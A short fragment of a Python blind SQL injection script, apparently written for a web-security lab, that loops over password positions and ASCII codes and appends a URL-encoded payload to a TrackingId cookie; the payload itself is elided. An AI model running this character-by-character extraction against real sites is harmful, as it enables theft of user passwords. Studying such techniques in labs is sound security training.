...
def sqli_password(url):
    ...
    for i in range(1,21):
        for j in range(32,126):
            ...
            sql_payload_encoded = urllib.parse.quote_plus(sql_payload)
            cookies = {'TrackingId': '0l03wS9i3yvdvYef' + sql_payload_encoded, 'session': 'QzrqSONXG7nTrtm02Yv6SCDToOnCauTP'}
